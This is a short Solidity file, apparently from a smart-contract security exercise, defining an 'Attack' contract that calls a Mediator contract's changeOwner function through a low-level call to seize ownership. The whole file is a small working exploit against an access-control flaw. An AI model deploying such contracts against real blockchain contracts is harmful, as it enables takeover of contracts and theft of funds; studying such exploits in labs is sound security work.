//SPDX-License-Identifier:MIT

pragma solidity ^0.6.0;

import "./Mediator.sol";

contract Attack{
    address public owner;
    Mediator public mediator;

    constructor(address payable _mediatorAddress) public{
        mediator = Mediator(_mediatorAddress);
    }

    function attack(address _owner) public payable{
        address(mediator).call(abi.encodeWithSignature("changeOwner(address)",_owner));
    }
}